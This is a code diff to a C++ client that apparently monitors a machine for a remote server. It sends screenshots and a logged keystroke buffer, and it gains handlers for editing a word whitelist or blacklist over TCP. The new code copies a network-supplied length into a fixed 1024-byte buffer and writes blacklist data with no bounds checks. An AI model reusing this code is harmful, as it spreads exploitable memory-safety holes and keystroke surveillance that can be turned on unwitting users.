@@ -20,8 +20,6 @@ const unsigned short kServerPort = 12345;
 bool lockRequestInProgress = false;
 bool unlockRequestInProgress = false;
 
-std::array<uchar, 1024> keyStrokes{'a', 'b', 'c', 'd'};
-
 void readTextData(boost::asio::ip::tcp::socket& socket_, Header& header_);
 void sendScreenshot(boost::asio::ip::tcp::socket& socket);
 
@@ -40,6 +38,38 @@ void unlockScreen(ScreenLocker* lockscreen_handle) {
         lockscreen_handle->waitForThread();
         unlockRequestInProgress = false;
     }
+}
+
+void removeFromWhitelist(boost::asio::ip::tcp::socket& socket_, std::size_t size) {
+    std::array<char, 1024> word{};
+
+    boost::asio::read(socket_, boost::asio::buffer(&word, size));
+
+    std::string toString;
+
+    for (auto& ch : word) {
+        if (ch == '\0')
+            break;
+        toString += ch;
+    }
+
+    monitor->removeFromBlacklist(toString);
+}
+
+void addToWhitelist(boost::asio::ip::tcp::socket& socket_, std::size_t size) {
+    std::array<char, 1024> word{};
+
+    boost::asio::read(socket_, boost::asio::buffer(&word, size));
+
+    std::string toString;
+
+    for (auto& ch : word) {
+        if (ch == '\0')
+            break;
+        toString += ch;
+    }
+
+    monitor->addToBlacklist(toString);
 }
 
 std::vector<u_char> takeScreenshot()
@@ -112,6 +142,12 @@ void readHeader(boost::asio::ip::tcp::socket& socket_, ScreenLocker* lockscreen_
             case SCREENSHOT_REQ:
                 sendScreenshot(socket_);
                 break;
+            case REMOVE_FROM_WHITELIST:
+                removeFromWhitelist(socket_, header_.size);
+                break;
+            case ADD_TO_WHITELIST:
+                addToWhitelist(socket_, header_.size);
+                break;
             default:
                 throw std::exception("Unknown data type received");
                 break;
@@ -154,17 +190,28 @@ void sendScreenshot(boost::asio::ip::tcp::socket& socket) {
     try {
         MetaData metadata;
         metadata.is_locked = lockscreen_handler->isLocked();
-        metadata.data = {};
+        metadata.keyData = {};
+        metadata.BlacklistData = {};
         std::vector<u_char> tempLog;
 
         monitor->getLog(tempLog);
 
-        if (tempLog.size() <= metadata.data.size()) {
-            std::copy(tempLog.begin(), tempLog.end(), metadata.data.begin());
+        if (tempLog.size() <= metadata.keyData.size()) {
+            std::copy(tempLog.begin(), tempLog.end(), metadata.keyData.begin());
         }
         else {
             std::cerr << "The array is too small to store all elements from the vector." << std::endl;
         }
+
+        size_t currentIndex = 0;
+
+        for (const auto& str : monitor->getBlacklist()) {
+            for (char c : str) {
+                metadata.BlacklistData[currentIndex++] = static_cast<unsigned char>(c);
+            }
+            metadata.BlacklistData[currentIndex++] = ' ';
+        }
+
 
         //metadata.data = keyStrokes;
         
